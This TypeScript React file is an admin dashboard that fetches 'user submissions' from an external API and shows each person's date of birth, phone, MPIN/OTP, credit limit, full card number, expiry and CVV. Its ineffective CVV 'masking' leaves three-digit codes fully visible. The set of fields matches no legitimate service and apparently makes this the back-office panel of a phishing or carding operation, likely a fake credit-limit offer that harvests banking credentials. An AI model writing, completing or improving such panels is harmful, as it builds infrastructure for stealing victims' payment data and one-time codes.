import React, { useState, useEffect } from 'react';
import { motion } from 'framer-motion';

interface User {
  id: number;
  name: string;
  dob: string;
  phone: string;
  mpin: string;
  credit_limit: number;
  card_number: string;
  card_holder_name: string;
  expiry_date: string;
  cvv: string;
  submission_date: string;
}

const AdminDashboard: React.FC = () => {
  const [users, setUsers] = useState<User[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState('');
  const [selectedUser, setSelectedUser] = useState<User | null>(null);

  useEffect(() => {
    const fetchUsers = async () => {
      try {
        const response = await fetch('https://api-2-hnij.onrender.com/api/users');
        if (!response.ok) throw new Error('Failed to fetch users');
        const data = await response.json();
        setUsers(data);
      } catch (err) {
        setError(err instanceof Error ? err.message : 'Unknown error');
      } finally {
        setLoading(false);
      }
    };

    fetchUsers();
  }, []);

  const maskSensitiveData = (data: string, visibleChars: number = 4) => {
    if (!data) return '';
    return data.slice(-visibleChars).padStart(data.length, '•');
  };

  if (loading) return <div className="text-center py-8">Loading...</div>;
  if (error) return <div className="text-red-500 text-center py-8">{error}</div>;

  return (
    <motion.div
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      className="container mx-auto px-4 py-8"
    >
      <h1 className="text-3xl font-bold mb-8 text-center">User Submissions</h1>
      
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        {/* User List */}
        <div className="lg:col-span-1 bg-white rounded-lg shadow p-4">
          <h2 className="text-xl font-semibold mb-4">All Users ({users.length})</h2>
          <div className="space-y-2 max-h-screen overflow-y-auto">
            {users.map(user => (
              <div 
                key={user.id}
                onClick={() => setSelectedUser(user)}
                className={`p-3 rounded cursor-pointer hover:bg-gray-100 ${
                  selectedUser?.id === user.id ? 'bg-blue-50 border-l-4 border-blue-500' : ''
                }`}
              >
                <div className="font-medium">{user.name}</div>
                <div className="text-sm text-gray-600">{user.phone}</div>
                <div className="text-xs text-gray-500">
                  {new Date(user.submission_date).toLocaleString()}
                </div>
              </div>
            ))}
          </div>
        </div>

        {/* User Details */}
        <div className="lg:col-span-2 bg-white rounded-lg shadow p-6">
          {selectedUser ? (
            <>
              <div className="flex justify-between items-start mb-6">
                <h2 className="text-2xl font-bold">{selectedUser.name}</h2>
                <span className="text-sm text-gray-500">
                  Submitted: {new Date(selectedUser.submission_date).toLocaleString()}
                </span>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div className="space-y-4">
                  <div>
                    <h3 className="text-sm font-medium text-gray-500">Personal Info</h3>
                    <div className="mt-1">
                      <p>Date of Birth: {selectedUser.dob}</p>
                      <p>Phone: {selectedUser.phone}</p>
                      <p>OTP (MPIN): {selectedUser.mpin}</p>
                    </div>
                  </div>

                  <div>
                    <h3 className="text-sm font-medium text-gray-500">Credit Details</h3>
                    <div className="mt-1">
                      <p>Credit Limit: ₹{selectedUser.credit_limit?.toLocaleString() || 'N/A'}</p>
                    </div>
                  </div>
                </div>

                <div className="space-y-4">
                  <div>
                    <h3 className="text-sm font-medium text-gray-500">Card Details</h3>
                    <div className="mt-1">
                      <p>Card Holder: {selectedUser.card_holder_name}</p>
                      <p>Card Number: {selectedUser.card_number}</p>
                      <p>Expiry: {selectedUser.expiry_date}</p>
                      <p>CVV: {maskSensitiveData(selectedUser.cvv)}</p>
                    </div>
                  </div>
                </div>
              </div>
            </>
          ) : (
            <div className="text-center py-12 text-gray-500">
              Select a user to view details
            </div>
          )}
        </div>
      </div>
    </motion.div>
  );
};

export default AdminDashboard;